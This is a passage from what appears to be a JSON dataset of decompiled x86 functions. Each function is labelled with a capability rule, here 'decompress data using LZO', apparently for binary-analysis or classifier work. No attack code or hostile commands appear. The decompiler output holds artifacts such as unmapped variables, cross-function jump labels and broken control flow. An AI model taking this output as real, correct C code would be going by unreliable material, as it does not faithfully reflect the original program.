(*0x4f59f4 == 0) {\n            iVar3 = *(var_38h + -4);\n            *(var_38h + -4) = iVar3 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = var_38h + -4;\n            iVar3 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar3 < 1) {\n            fcn.004640a0(&var_3dh);\n        }\n    }\n    else {\n        *arg_20h = var_3ch;\n    }\n    if (var_1ch != NULL) {\n        (*var_1ch)(&var_34h);\n    }\n    return uVar5 & 0xffffffff | (arg_ch & 0xffff0000 | uVar5 >> 0x20 & 0xffff) << 0x20;\n}\n",
        "token_count": 802
    },
    "004302b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint __cdecl fcn.004302b0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t *arg_1ch)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    uint var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_30h;\n    code *var_1ch;\n    uint var_bp_ch;\n    \n    var_1ch = NULL;\n    uVar2 = 0x4302d9;\n    fcn.0046d6c0(arg_1ch);\n    var_30h = *(*arg_1ch + -0xc);\n    var_1ch = 0x473fd0;\n    uVar1 = fcn.00472450(uVar2 & 0xffffff00, *(in_ECX + 8), arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, 0, \n                         &fcn.004302b0::var_34h);\n    if (var_1ch != NULL) {\n        (*var_1ch)(&fcn.004302b0::var_34h);\n    }\n    return uVar1;\n}\n",
        "token_count": 303
    },
    "004304e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint __cdecl fcn.004304e0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t *arg_1ch)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    uint var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_30h;\n    code *var_1ch;\n    uint var_bp_ch;\n    \n    var_1ch = NULL;\n    uVar2 = 0x430509;\n    fcn.00465950(arg_1ch);\n    var_30h = *(*arg_1ch + -0xc);\n    var_1ch = 0x474050;\n    uVar1 = fcn.004726b0(uVar2 & 0xffffff00, *(in_ECX + 8), arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, 0, \n                         &fcn.004304e0::var_34h);\n    if (var_1ch != NULL) {\n        (*var_1ch)(&fcn.004304e0::var_34h);\n    }\n    return uVar1;\n}\n",
        "token_count": 298
    },
    "00431ab0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl fcn.00431ab0(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar var_dh;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    (**(*arg_8h + 0xc))(arg_8h, arg_ch);\n    fcn.004710e0(var_ch, *(var_ch + -0xc));\n    if (*0x4f59f4 == 0) {\n        iVar2 = *(var_ch + -4);\n        *(var_ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return;\n    }\n    fcn.0046bf60(&var_dh);\n    return;\n}\n",
        "token_count": 235
    },
    "00431ef0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00431ef0(int32_t *param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    fcn.00431cc0();\n    if (*(*param_1 + 0x18) == 0x431f70) {\n        return param_2;\n    }\n    // WARNING: Could not recover jumptable at 0x00431f30. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar1 = (**(*param_1 + 0x18))();\n    return uVar1;\n}\n",
        "token_count": 130
    },
    "00432540": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t ** __cdecl fcn.00432540(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t **ppiVar5;\n    uint uVar6;\n    int32_t **in_ECX;\n    int32_t *piVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint *in_stack_ffffffcc;\n    int32_t **var_28h;\n    int32_t s;\n    int32_t *var_20h;\n    int32_t **var_1ch;\n    uint var_bp_ch;\n    \n    var_1ch = in_ECX + 2;\n    *in_ECX = var_1ch;\n    *(in_ECX + 2) = 0;\n    iVar9 = *arg_8h;\n    in_ECX[1] = NULL;\n    piVar4 = *(iVar9 + 0x10);\n    s = *piVar4;\n    if (s == 0) {\n        fcn.00490f00(0, 0, 1, 0x2a);\n        return in_ECX;\n    }\n    if (piVar4[1] == 0) {\ncode_r0x004327b0:\n        iVar9 = s;\n        uVar6 = sub.msvcrt.dll_strlen(s);\n        fcn.004906f0(0, 0, iVar9, uVar6);\n        return in_ECX;\n    }\n    uVar8 = 0;\n    iVar9 = s;\n    var_28h = in_ECX;\n    var_20h = piVar4;\n    do {\n        uVar8 = uVar8 + 1;\n        iVar1 = var_20h[uVar8];\n        iVar3 = sub.msvcrt.dll_strcmp(iVar9, iVar1);\n        iVar9 = iVar1;\n    } while (uVar8 < 5 && iVar3 == 0);\n    in_ECX = var_28h;\n    if (iVar3 == 0) goto code_r0x004327b0;\n    fcn.004924e0(0x80);\n    uVar6 = **0x50650c;\n    uVar8 = sub.msvcrt.dll_strlen(uVar6);\n    if (0x7fffffffU - var_28h[1] < uVar8) {\n        fcn.0049ec30(0x501fd2);\ncode_r0x00432886:\n        fcn.0049ec30(0x501fd2);\ncode_r0x00432892:\n        fcn.0049ec30(0x501fd2);\n    }\n    else {\n        fcn.00492660(uVar6, uVar8);\n        piVar4 = var_28h[1];\n        ppiVar5 = *var_28h;\n        if (var_1ch == ppiVar5) {\n            piVar7 = 0xf;\n        }\n        else {\n            piVar7 = var_28h[2];\n        }\n        if (piVar7 < piVar4 + 1) {\n            fcn.00492830(piVar4, 0, 0, 1);\n            ppiVar5 = *var_28h;\n        }\n        *(ppiVar5 + piVar4) = 0x3d;\n        var_28h[1] = piVar4 + 1;\n        *(*var_28h + 1 + piVar4) = 0;\n        uVar6 = **(*arg_8h + 0x10);\n        uVar8 = sub.msvcrt.dll_strlen(uVar6);\n        if (uVar8 <= 0x7fffffffU - var_28h[1]) {\n            fcn.00492660(uVar6, uVar8);\n            iVar9 = 4;\n            while( true ) {\n                piVar4 = var_28h[1];\n                var_20h = piVar4 + 1;\n                ppiVar5 = *var_28h;\n                if (var_1ch == ppiVar5) {\n                    piVar7 = 0xf;\n                }\n                else {\n                    piVar7 = var_28h[2];\n                }\n                if (piVar7 < var_20h) {\n                    fcn.00492830(piVar4, 0, 0, 1);\n                    ppiVar5 = *var_28h;\n                }\n                *(ppiVar5 + piVar4) = 0x3b;\n                var_28h[1] = piVar4 + 1;\n                *(*var_28h + 1 + piVar4) = 0;\n                uVar6 = *(*0x50650c + iVar9);\n                uVar8 = sub.msvcrt.dll_strlen(uVar6);\n                if (0x7fffffffU - var_28h[1] < uVar8) break;\n                fcn.00492660(uVar6, uVar8);\n                piVar4 = var_28h[1];\n                var_20h = piVar4 + 1;\n                ppiVar5 = *var_28h;\n                if (var_1ch == ppiVar5) {\n                    piVar7 = 0xf;\n                }\n                else {\n                    piVar7 = var_28h[2];\n                }\n                if (piVar7 < var_20h) {\n                    uVar8 = 1;\n                    fcn.00492830();\n                    ppiVar5 = *var_28h;\n                }\n                *(ppiVar5 + piVar4) = 0x3d;\n                var_28h[1] = piVar4 + 1;\n                *(*var_28h + 1 + piVar4) = 0;\n                uVar6 = *(*(*arg_8h + 0x10) + iVar9);\n                uVar8 = sub.msvcrt.dll_strlen(uVar6, uVar8);\n                if (0x7fffffffU - var_28h[1] < uVar8) goto code_r0x00432886;\n                fcn.00492660(uVar6, uVar8);\n                iVar9 = iVar9 + 4;\n                if (iVar9 == 0x18) {\n                    return var_28h;\n                }\n            }\n            goto code_r0x00432892;\n        }\n    }\n    piVar4 = fcn.0049ec30(0x501fd2);\n    if (var_1ch != *var_28h) {\n        fcn.004a34c0(*var_28h);\n    }\n    fcn.0041b360(piVar4);\n    if (in_stack_ffffffcc != &var_28h) {\n        fcn.004a34c0(in_stack_ffffffcc);\n    }\n    if (piVar4 == 0xffffffff) {\n        fcn.004a37a0(var_28h);\n    }\n    uVar6 = fcn.0041b360();\n    fcn.004a36d0(uVar6);\n    fcn.004a3840();\n    piVar7 = var_28h[1];\n    while (piVar4 = piVar4 + 1,  piVar4 <= var_28h[2] && var_28h[2] != piVar4) {\n        piVar2 = piVar7[piVar4];\n        if (piVar2 != NULL) {\n            if (*0x4f59f4 == 0) {\n                iVar9 = piVar2[1];\n                piVar2[1] = iVar9 + -1;\n            }\n            else {\n                LOCK();\n                piVar7 = piVar2 + 1;\n                iVar9 = *piVar7;\n                *piVar7 = *piVar7 + -1;\n            }\n            if (iVar9 == 1) {\n                (**(*piVar2 + 4))();\n            }\n            piVar7 = var_28h[1];\n        }\n    }\n    if (piVar7 != NULL) {\n        fcn.004a34b0(piVar7);\n    }\n    ppiVar5 = var_28h[3];\n    if (ppiVar5 != NULL) {\n        if (var_28h[2] != NULL) {\n            piVar4 = NULL;\n            do {\n                piVar7 = ppiVar5[piVar4];\n                if (piVar7 != NULL) {\n                    if (*0x4f59f4 == 0) {\n                        iVar9 = piVar7[1];\n                        piVar7[1] = iVar9 + -1;\n                    }\n                    else {\n                        LOCK();\n                        piVar2 = piVar7 + 1;\n                        iVar9 = *piVar2;\n                        *piVar2 = *piVar2 + -1;\n                    }\n                    if (iVar9 == 1) {\n                        (**(*piVar7 + 4))();\n                    }\n                    ppiVar5 = var_28h[3];\n                }\n                piVar4 = piVar4 + 1;\n            } while (piVar4 <= var_28h[2] && var_28h[2] != piVar4);\n            if (ppiVar5 == NULL) goto code_r0x0048f1de;\n        }\n        ppiVar5 = fcn.004a34b0(ppiVar5);\n    }\ncode_r0x0048f1de:\n    piVar4 = var_28h[4];\n    if (piVar4 != NULL) {\n        iVar9 = 0;\n        do {\n            ppiVar5 = *(piVar4 + iVar9);\n            if (ppiVar5 != NULL) {\n                ppiVar5 = fcn.004a34b0(ppiVar5);\n                piVar4 = var_28h[4];\n            }\n            iVar9 = iVar9 + 4;\n        } while (iVar9 != 0x18);\n        if (piVar4 != NULL) {\n            ppiVar5 = fcn.004a34b0(piVar4);\n        }\n    }\n    return ppiVar5;\n}\n",
        "token_count": 2249
    },
    "004328c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t * __cdecl fcn.004328c0(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t *in_ECX;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    iVar3 = fcn.0046ba90(0, 0, &var_19h);\n    *in_ECX = iVar3;\n    piVar1 = *(*arg_8h + 0x10);\n    iVar8 = *piVar1;\n    if (iVar8 == 0) {\n        fcn.0046bde0(0, *(iVar3 + -0xc), 1, 0x2a);\n        return in_ECX;\n    }\n    if (piVar1[1] != 0) {\n        uVar7 = 0;\n        iVar3 = iVar8;\n        do {\n            uVar7 = uVar7 + 1;\n            iVar2 = piVar1[uVar7];\n            iVar4 = sub.msvcrt.dll_strcmp(iVar3, iVar2);\n            iVar3 = iVar2;\n        } while (uVar7 < 5 && iVar4 == 0);\n        if (iVar4 != 0) {\n            fcn.0046d280(0x80);\n            uVar6 = **0x50650c;\n            uVar5 = sub.msvcrt.dll_strlen(uVar6);\n            fcn.0046c3b0(uVar6, uVar5);\n            iVar8 = *in_ECX;\n            iVar3 = *(iVar8 + -0xc);\n            uVar7 = iVar3 + 1;\n            if ((*(iVar8 + -8) <= uVar7 && uVar7 != *(iVar8 + -8)) || (0 < *(iVar8 + -4))) {\n                fcn.0046d280(uVar7);\n            }\n            *(*in_ECX + *(*in_ECX + -0xc)) = 0x3d;\n            iVar8 = *in_ECX;\n            *(iVar8 + -0xc) = uVar7;\n            *(iVar8 + -4) = 0;\n            *(iVar8 + 1 + iVar3) = 0;\n            uVar6 = **(*arg_8h + 0x10);\n            uVar5 = sub.msvcrt.dll_strlen(uVar6);\n            fcn.0046c3b0(uVar6, uVar5);\n            iVar8 = 4;\n            do {\n                iVar3 = *in_ECX;\n                iVar2 = *(iVar3 + -0xc);\n                uVar7 = iVar2 + 1;\n                if ((*(iVar3 + -8) <= uVar7 && uVar7 != *(iVar3 + -8)) || (0 < *(iVar3 + -4))) {\n                    fcn.0046d280(uVar7);\n                }\n                *(*in_ECX + *(*in_ECX + -0xc)) = 0x3b;\n                iVar3 = *in_ECX;\n                *(iVar3 + -0xc) = uVar7;\n                *(iVar3 + -4) = 0;\n                *(iVar3 + 1 + iVar2) = 0;\n                uVar6 = *(*0x50650c + iVar8);\n                uVar5 = sub.msvcrt.dll_strlen(uVar6);\n                fcn.0046c3b0(uVar6, uVar5);\n                iVar3 = *in_ECX;\n                iVar2 = *(iVar3 + -0xc);\n                uVar7 = iVar2 + 1;\n                if ((*(iVar3 + -8) <= uVar7 && uVar7 != *(iVar3 + -8)) || (0 < *(iVar3 + -4))) {\n                    fcn.0046d280(uVar7);\n                }\n                *(*in_ECX + *(*in_ECX + -0xc)) = 0x3d;\n                iVar3 = *in_ECX;\n                *(iVar3 + -0xc) = uVar7;\n                *(iVar3 + -4) = 0;\n                *(iVar3 + 1 + iVar2) = 0;\n                uVar6 = *(*(*arg_8h + 0x10) + iVar8);\n                uVar5 = sub.msvcrt.dll_strlen(uVar6);\n                fcn.0046c3b0(uVar6, uVar5);\n                iVar8 = iVar8 + 4;\n            } while (iVar8 != 0x18);\n            return in_ECX;\n        }\n    }\n    uVar6 = sub.msvcrt.dll_strlen(iVar8);\n    fcn.0046c6f0(iVar8, uVar6);\n    return in_ECX;\n}\n",
        "token_count": 1110
    },
    "00432b40": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint * __cdecl fcn.00432b40(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t in_ECX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint in_stack_00000008;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint32_t in_stack_ffffffcc;\n    uint32_t uVar4;\n    uint uVar5;\n    uint noname_3;\n    uint noname_4;\n    uint in_stack_ffffffe4;\n    uint in_stack_ffffffe8;\n    uint in_stack_ffffffec;\n    uint var_bp_ch;\n    \n    noname_4 = 0xfffffffe;\n    noname_3 = 0x506e68;\n    uVar5 = 0x506e70;\n    puVar2 = fcn.004a3c60();\n    if (puVar2 == NULL) {\n        if (arg_8h == 0x4f6f60) {\n            puVar3 = fcn.004a3500(0x68, uVar5);\n            puVar3[1] = 0;\n            *puVar3 = 0x50adf0;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 4) = 0;\n            puVar3[5] = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            *(puVar3 + 9) = 0;\n            *(puVar3 + 0x19) = 0;\n            puVar2 = fcn.004a3500(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x50b4dc;\n            puVar2[2] = puVar3;\n            uVar4 = 0x432cff;\n            fcn.0049ba80(0);\n            iVar1 = *0x4f59f4;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x509ed0;\n            puVar2[4] = puVar3;\n            fcn.00474e60(uVar4 & 0xffffff00, in_ECX, puVar3);\n        }\n        else if (arg_8h == 0x4f6f38) {\n            puVar2 = fcn.004a3500(0x10, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x50b370;\n            uVar5 = fcn.0048f260();\n            puVar2[2] = uVar5;\n            iVar1 = *0x4f59f4;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x509df0;\n        }\n        else if (arg_8h == 0x4f6f68) {\n            puVar2 = fcn.004a3500(0xc, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x50b524;\n            puVar2[2] = in_ECX;\n            if (*0x4f59f4 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x509f60;\n        }\n        else if (arg_8h == 0x4f6f78) {\n            puVar2 = fcn.004a3500(0xc, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x50b5e4;\n            puVar2[2] = in_ECX;\n            if (*0x4f59f4 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x50a008;\n        }\n        else if (arg_8h == 0x4f6f80) {\n            puVar2 = fcn.004a3500(0xc, uVar5);\n            iVar1 = *0x4f59f4;\n            puVar2[1] = 0;\n            *puVar2 = 0x50b614;\n            puVar2[2] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x50a068;\n        }\n        else if (arg_8h == 0x4f6d70) {\n            puVar3 = fcn.004a3500(0x44, uVar5);\n            *(puVar3 + 4) = 0;\n            *puVar3 = 0x50af24;\n            puVar3[1] = 0;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 0x12) = 0;\n            puVar3[5] = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            puVar3[9] = 0;\n            puVar3[10] = 0;\n            puVar3[0xb] = 0;\n            puVar3[0xc] = 0;\n            puVar3[0xd] = 0;\n            *(puVar3 + 0x43) = 0;\n            puVar2 = fcn.004a3500(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x50a7bc;\n            puVar2[2] = puVar3;\n            fcn.0046e4d0(0, 0);\n            iVar1 = *0x4f59f4;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x50a130;\n            puVar2[4] = puVar3;\n            fcn.00475bd0(in_stack_ffffffcc & 0xffffff00, in_ECX, puVar3);\n        }\n        else if (arg_8h == 0x4f6d6c) {\n            puVar3 = fcn.004a3500(0x44, uVar5);\n            *puVar3 = 0x50af14;\n            puVar3[1] = 0;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 4) = 0;\n            *(puVar3 + 0x12) = 0;\n            puVar3[5] = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            puVar3[9] = 0;\n            puVar3[10] = 0;\n            puVar3[0xb] = 0;\n            puVar3[0xc] = 0;\n            puVar3[0xd] = 0;\n            *(puVar3 + 0x43) = 0;\n            puVar2 = fcn.004a3500(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x50a788;\n            puVar2[2] = puVar3;\n            fcn.0046e0f0(0, 0);\n            iVar1 = *0x4f59f4;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x50a0c8;\n            puVar2[4] = puVar3;\n            fcn.004756f0(in_stack_ffffffcc & 0xffffff00, in_ECX, puVar3);\n        }\n        else if (arg_8h == 0x4f6f58) {\n            puVar2 = fcn.004a3500(0x14, uVar5);\n            fcn.0049b820(0);\n            iVar1 = *0x4f59f4;\n            puVar2[4] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x509e60;\n        }\n        else if (arg_8h == 0x4f6f64) {\n            puVar3 = fcn.004a3500(0xa8, uVar5);\n            puVar3[1] = 0;\n            *puVar3 = 0x50ae00;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 4) = 0;\n            puVar3[5] = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            puVar3[9] = 0;\n            *(puVar3 + 0x29) = 0;\n            puVar2 = fcn.004a3500(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x50b500;\n            puVar2[2] = puVar3;\n            uVar4 = 0x433123;\n            fcn.0049bdd0(0);\n            iVar1 = *0x4f59f4;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x509f18;\n            puVar2[4] = puVar3;\n            fcn.00475260(uVar4 & 0xffffff00, in_ECX, puVar3, noname_3, noname_4, in_stack_ffffffe4, in_stack_ffffffe8, \n                         in_stack_ffffffec, unaff_EBX, unaff_ESI, unaff_EDI, unaff_EBP, unaff_retaddr, 0x4f6f64, \n                         in_stack_00000008, in_stack_0000000c, in_stack_00000010, in_stack_00000014, in_stack_00000018, \n                         in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c, \n                         in_stack_00000030, in_stack_00000034, in_stack_00000038, in_stack_0000003c, in_stack_00000040, \n                         in_stack_00000044, in_stack_00000048);\n        }\n        else if (arg_8h == 0x4f6f3c) {\n            puVar2 = fcn.004a3500(0x10, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x50b38c;\n            uVar5 = fcn.0048f260();\n            puVar2[2] = uVar5;\n            iVar1 = *0x4f59f4;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x509e28;\n        }\n        else if (arg_8h == 0x4f6f6c) {\n            puVar2 = fcn.004a3500(0xc, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x50b54c;\n            puVar2[2] = in_ECX;\n            if (*0x4f59f4 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x509fb4;\n        }\n        else if (arg_8h == 0x4f6f7c) {\n            puVar2 = fcn.004a3500(0xc, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x50b5fc;\n            puVar2[2] = in_ECX;\n            if (*0x4f59f4 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x50a038;\n        }\n        else if (arg_8h == 0x4f6f84) {\n            puVar2 = fcn.004a3500(0xc, uVar5);\n            iVar1 = *0x4f59f4;\n            puVar2[1] = 0;\n            *puVar2 = 0x50b62c;\n            puVar2[2] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x50a098;\n        }\n        else if (arg_8h == 0x4f6d78) {\n            puVar3 = fcn.004a3500(0x54, uVar5);\n            puVar3[1] = 0;\n            *puVar3 = 0x50af44;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 4) = 0;\n            *(puVar3 + 0x12) = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            puVar3[9] = 0;\n            puVar3[10] = 0;\n            puVar3[0xb] = 0;\n            puVar3[0xc] = 0;\n            puVar3[0xd] = 0;\n            puVar3[0xe] = 0;\n            *(puVar3 + 0x52) = 0;\n            puVar2 = fcn.004a3500(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x50a824;\n            puVar2[2] = puVar3;\n            fcn.0046eca0(0, 0);\n            iVar1 = *0x4f59f4;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x50a200;\n            puVar2[4] = puVar3;\n            fcn.00476730(in_stack_ffffffcc & 0xffffff00, in_ECX, puVar3);\n        }\n        else if (arg_8h == 0x4f6d74) {\n            puVar3 = fcn.004a3500(0x54, uVar5);\n            puVar3[1] = 0;\n            *puVar3 = 0x50af34;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 4) = 0;\n            *(puVar3 + 0x12) = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            puVar3[9] = 0;\n            puVar3[10] = 0;\n            puVar3[0xb] = 0;\n            puVar3[0xc] = 0;\n            puVar3[0xd] = 0;\n            puVar3[0xe] = 0;\n            *(puVar3 + 0x52) = 0;\n            puVar2 = fcn.004a3500(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x50a7f0;\n            puVar2[2] = puVar3;\n            uVar5 = 0;\n            fcn.0046e8b0(0);\n            iVar1 = *0x4f59f4;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x50a198;\n            puVar2[4] = puVar3;\n            fcn.00476150(in_stack_ffffffcc & 0xffffff00, in_ECX, puVar3, uVar5, noname_3, noname_4, in_stack_ffffffe4, \n                         in_stack_ffffffe8, in_stack_ffffffec, unaff_EBX, unaff_ESI, unaff_EDI, unaff_EBP, unaff_retaddr\n                         , 0x4f6d74, in_stack_00000008, in_stack_0000000c, in_stack_00000010, in_stack_00000014, \n                         in_stack_00000018, in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028, \n                         in_stack_0000002c, in_stack_00000030, in_stack_00000034, in_stack_00000038, in_stack_0000003c, \n                         in_stack_00000040, in_stack_00000044);\n        }\n        else {\n            if (arg_8h != 0x4f6f5c) {\n                uVar5 = fcn.0049eb30(0x5021a4);\n                fcn.0048f380();\n                fcn.004a34c0(arg_8h);\n                fcn.0041b360(uVar5);\n                fcn.0048f380();\n                fcn.004a34c0(arg_8h);\n                fcn.0041b360(uVar5);\n                fcn.0048f380();\n                do {\n                    fcn.004a34c0(arg_8h);\n                    fcn.0041b360(uVar5);\n                    fcn.004a34c0(arg_8h);\n                    fcn.0041b360(uVar5);\n                    fcn.00433e60();\n                    fcn.0046e880();\n                } while( true );\n            }\n            puVar2 = fcn.004a3500(0x14, uVar5);\n            fcn.0049b9b0(0);\n            iVar1 = *0x4f59f4;\n            puVar2[4] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x509e98;\n        }\n    }\n    else {\n        puVar2 = *puVar2;\n    }\n    return puVar2;\n}\n",
        "token_count": 5215
    },
    "004334d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
